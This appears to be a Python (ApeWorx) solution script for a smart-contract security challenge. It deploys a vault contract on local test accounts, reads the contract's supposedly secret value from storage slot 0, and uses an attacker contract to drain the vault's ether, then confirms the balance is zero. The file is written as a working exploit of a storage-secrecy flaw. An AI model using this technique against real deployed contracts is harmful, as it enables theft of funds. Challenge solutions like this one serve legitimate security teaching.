from ape import accounts, project, networks

w3 = networks.provider.web3

ETH_IN_VAULT = w3.to_wei(0.0001, "ether")


def main():
    # --- BEFORE EXPLOIT --- #
    print("\n--- Setting up scenario ---\n")

    # get accounts
    deployer = accounts.test_accounts[0]
    attacker = accounts.test_accounts[1]

    # deploy challenge contract
    print("\n--- Deploying Secure Vault ---\n")
    vault = project.N1SecureVault.deploy(sender=deployer, value=ETH_IN_VAULT)

    # --- EXPLOIT GOES HERE --- #
    print("\n--- Initiating exploit... ---\n")

    # exploit
    secret = w3.eth.get_storage_at(vault.address, 0)
    attacker_contract = project.SecureVaultAttacker.deploy(
        vault.address,
        sender=attacker,
        value=ETH_IN_VAULT,
    )
    attacker_contract.attack(secret, sender=attacker)

    # --- AFTER EXPLOIT => attacker should have drained all funds from vault --- #
    print("\n--- After exploit: Attacker drained funds from the Vault ---\n")

    assert vault.balance == 0

    print("\n--- 🥂 Challenge Completed! 🥂 ---\n")


if __name__ == "__main__":
    main()
